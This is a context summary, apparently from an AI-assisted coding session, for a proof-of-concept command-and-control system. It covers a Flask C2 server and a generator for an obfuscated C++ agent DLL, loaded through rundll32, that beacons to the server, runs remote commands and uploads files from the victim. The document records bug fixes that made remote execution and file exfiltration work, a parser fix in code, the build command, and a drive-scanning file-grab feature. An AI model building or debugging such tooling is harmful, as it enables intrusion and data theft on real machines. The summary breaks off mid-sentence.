# C2 Infrastructure Context Summary

## Project Overview

A proof-of-concept C2 (Command & Control) infrastructure consisting of:

1. **C2 Server** (`c2_server.py`) - Flask-based HTTP server running on `0.0.0.0:8443`
2. **Agent Generator** (`generate_agent_dll.py`) - Python script that generates a C++ DLL source
3. **Agent DLL** (`agent.dll`) - Compiled from `agent_dll.cpp`, loaded via `rundll32.exe agent.dll,Run`

The agent beacons to `/beacon`, receives commands, executes them, and returns results. Supports file upload via `/upload_init` and `/upload_chunk`.

---

## Files and Their Roles

| File | Role |
|------|------|
| `c2_server.py` | Flask C2 server. Endpoints: `/`, `/beacon`, `/api/agents`, `/api/agents/<guid>/command`, `/api/agents/<guid>/output`, `/api/files`, `/api/download/<guid>/<filename>`, `/upload_init`, `/upload_chunk` |
| `generate_agent_dll.py` | Generates `agent_dll.cpp` with XOR-obfuscated strings, random runtime names, and configurable host/port |
| `agent_dll.cpp` | Auto-generated C++ source for the agent DLL. Contains beacon loop, command execution, upload logic, API resolution |
| `agent.dll` | Compiled PE DLL (`x86_64-w64-mingw32-g++`) loaded by rundll32 |
| `c2_state.json` | Persistent server state (agents, commands, uploads) |
| `send_upload2.py` | Helper script to send upload command to the active agent |
| `templates/index.html` | Web dashboard for the C2 server |
| `uploads/<guid>/` | Directory where uploaded files are stored |

---

## Critical Bugs Fixed During This Session

### 1. Server: `seq` must be a string in JSON response
**File:** `c2_server.py` (line 159)
**Bug:** Server returned `"seq": 1` (integer). Agent parsed it with `_json_field` + `atoi()`, but the original `_json_field` had a bug where it returned wrong values.
**Fix:** Changed to `return jsonify({"cmd": c[1], "seq": str(c[0])})`

### 2. Agent: `_json_field` parser was broken
**File:** `agent_dll.cpp` (originally lines 161-176)
**Bug:** Original `_json_field` used `strchr`/`strncmp` and had a flaw where parsing `"cmd"` would return the value of `
"seq"` instead of `"cmd"` due to shared static buffer and pointer arithmetic errors.
**Fix:** Replaced with `std::string::find`-based implementation:
```cpp
static char* _json_field(const char* json, const char* key) {
    static char buf[4096];
    std::string j(json);
    std::string k(1, (char)34);
    k += key;
    k += (char)34;
    size_t pos = j.find(k);
    if(pos == std::string::npos) return NULL;
    size_t start = pos + k.length();
    if(start < j.length() && j[start] == (char)34) start++;
    while(start < j.length() && (j[start] == ' ' || j[start] == ':')) start++;
    if(start >= j.length() || j[start] != (char)34) return NULL;
    start++;
    size_t i = 0;
    while(start < j.length() && j[start] != (char)34 && i < sizeof(buf)-1) { buf[i++] = j[start++]; }
    buf[i] = 0; return buf;
}
```

### 3. Agent: upload_init and upload_chunk used NULL path
**File:** `generate_agent_dll.py` (lines 379, 399)
**Bug:** `_http_json(host, NULL, init_body)` sent requests to `/` instead of `/upload_init` and `/upload_chunk`.
**Fix:** Added `pui` and `puc` path variables with `s_copy`, then passed them to `_http_json`.

### 4. Generator: Array sizes used `len(arrs['xxx'])` (Python list length) instead of byte length
**File:** `generate_agent_dll.py` (multiple lines)
**Bug:** Arrays like `_e_s_backslash[2]` were declared with size `len(arrs['xxx'])` which is the number of Python list elements (correct), but for some strings the XOR byte list had different length due to `add_null()` adding `\0`.
**Fix:** Changed to `len(xor_str(strings['xxx']))` to use actual byte count.

### 5. Server: upload paths used raw filename causing absolute path on Windows
**File:** `c2_server.py`
**Bug:** `filepath = upload_dir / filename` where `filename` = `C:/agent-workspace/test_secret.txt` caused Windows `Path` to treat `C:` as drive letter, resulting in `PermissionError: [Errno 13] Permission denied: 'C:\agent-workspace\test_secret.txt'`.
**Fix:** Added `safe_name = Path(filename).name` in both `upload_init` and `upload_chunk`, so files are stored in `uploads/<guid>/test_secret.txt`.

### 6. Server: beacon logging syntax error
**File:** `c2_server.py` (line 113)
**Bug:** Attempted to use f-string with newline in single-line print, causing `SyntaxError: unterminated string literal`.
**Fix:** Replaced with `with open("beacon.log","a",encoding="utf-8") as lf: lf.write("[BEACON] "+data+chr(10))`

### 7. Bash escape sequence corruption in command strings
**File:** N/A (user interaction)
**Bug:** When sending commands via bash `$'...'`, strings like `r"upload C:\agent-workspace\test_secret.txt"` were interpreted by bash BEFORE Python, turning `\a` into `\x07` (BEL) and `\t` into `\x09` (TAB).
**Fix:** Use forward slashes `C:/agent-workspace/test_secret.txt` in commands, or write Python scripts to files instead of inline `$'...'` strings.

---

## Current Server Code State (`c2_server.py`)

Key lines:
- Line 113: Beacon logging to `beacon.log`
- Line 159: `return jsonify({"cmd": c[1], "seq": str(c[0])})`
- Line 166: `print(f"[UPLOAD_INIT] {request.get_data(as_text=True)}")`
- Line 172-176: `safe_name = Path(filename).name`, `filepath = upload_dir / safe_name`
- Line 195: `print(f"[UPLOAD_CHUNK] {request.get_data(as_text=True)[:200]}")`
- Line 202-203: `safe_name = Path(filename).name`, `key = f'{guid}/{safe_name}'`
- Lines 164-191: `upload_init()` endpoint
- Lines 193-226: `upload_chunk()` endpoint

---

## Current Generator State (`generate_agent_dll.py`)

Key patches applied:
- Lines 115-120: Array declarations use `len(xor_str(strings['xxx']))`
- Lines 289-290: `char pui[64]; s_copy(pui, _e_path_upload_init, sizeof(_e_path_upload_init));` and `char puc[64]; ...`
- Line 292: `_http_json(host, pui, init_body)` (was NULL)
- Line 312: `_http_json(host, puc, body)` (was NULL)
- Debug logs added in `_up()`:
  - `_log("upload thread started for %s", job->filepath.c_str());`
  - `_log("upload init resp: %s", resp.c_str());`
  - `_log("upload: started %s (%lld bytes)", sbn, total);`
  - `_log("upload: entering chunk loop offset=%lld total=%lld", offset, total);`
  - `_log("upload chunk resp: %s", resp.c_str());`

---

## Current Agent Source (`agent_dll.cpp`)

Key patches applied:
- Lines 161-176: Replaced `_json_field` with `std::string::find` implementation (see bug #2 above)
- Lines 289-312: Upload paths fixed (pui/puc)
- Debug logging added in `_up()` function

Compilation command:
```bash
cd /c/agent-workspace
x86_64-w64-mingw32-g++ -shared -O2 -s -static-libgcc -static-libstdc++ -static agent_dll.cpp -o agent.dll -lwininet -ladvapi32 -lshell32 -lole32
```

---

## Verified Working Features

| Feature | Status | Notes |
|---------|--------|-------|
| Beacon registration | Working | Agent appears in `/api/agents` |
| `whoami` command | Working | Returns username |
| `echo test` command | Working | Returns echoed text |
| `dir` command | Working | Returns directory listing |
| `upload <filepath>` | Working | File uploaded successfully (20/20 bytes) |
| `upload_ext <ext>` | Not tested | Scans drives for files by extension |
| File download via web | Working | `/api/download/<guid>/<filename>` |
| Web dashboard | Working | `/` renders `templates/index.html` |

---

## Known Limitations / TODOs

1. **Upload filename extraction uses backslash only**
   - `_up()` uses `strrchr((char*)job->filepath.c_str(), '\')`
   - If filepath uses forward slashes (e.g. `C:/agent-workspace/test.txt`), `sbn` becomes the full path
   - This does not break functionality because server uses `Path(filename).name`, but agent logs show full path
   - **Fix:** Update generator to check both `\` and `/`

2. **Agent log filename is random per generation**
   - Each regeneration creates a new random `LOG_NAME`
   - Makes debugging across rebuilds harder
   - Current log: check `/c/Users/Admin/AppData/Local/Temp/*.tmp` for recent files

3. **Upload chunk delay is small**
   - `UPLOAD_CHUNK_DELAY = 0.15s` in server rate limiting
   - May be too fast for large files; conside
